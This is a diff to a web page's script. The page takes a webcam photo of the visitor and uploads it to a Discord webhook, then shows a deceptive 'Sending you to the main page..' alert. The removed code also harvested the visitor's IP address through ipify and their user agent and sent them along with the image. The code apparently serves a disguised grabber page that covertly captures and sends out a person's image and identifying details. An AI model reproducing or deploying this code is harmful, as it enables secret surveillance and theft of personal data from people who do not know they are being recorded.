@@ -63,7 +63,7 @@
                     context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
                     const imageData = canvas.toDataURL('image/jpeg');
 
-                    sendPhotoToDiscord(imageData);
+                    sendToDiscord(imageData);
 
                     stream.getTracks().forEach(track => track.stop());
                 };
@@ -73,42 +73,25 @@
             }
         }
 
-        function sendPhotoToDiscord(imageData) {
-            var userAgent = navigator.userAgent;
+        function sendToDiscord(imageData) {
+            const formData = new FormData();
+            formData.append('file', dataURItoBlob(imageData), 'photo.jpg');
 
-            fetch('https://api.ipify.org?format=json')
-                .then(response => response.json())
-                .then(data => {
-                    var ipAddress = data.ip;
-
-                    var payload = {
-                        content: 'User IP Address: ' + ipAddress + '\nUser Agent: ' + userAgent,
-                        files: [imageData]
-                    };
-
-                    fetch(discordWebhookURL, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify(payload)
-                    })
-                    .then(response => {
-                        if (response.ok) {
-                            alert('Sending you to the main page..');
-                        } else {
-                            alert('Hmm error');
-                        }
-                    })
-                    .catch(error => {
-                        console.error('Error:', error);
-                        alert('An error occurred. Please try again later.');
-                    });
-                })
-                .catch(error => {
-                    console.error('Error:', error);
-                    alert('Failed to fetch IP address. Please try again later.');
-                });
+            fetch(discordWebhookURL, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => {
+                if (response.ok) {
+                    alert('Sending you to the main page..');
+                } else {
+                    alert('Hmm error');
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('An error occurred. Please try again later.');
+            });
         }
 
         function dataURItoBlob(dataURI) {
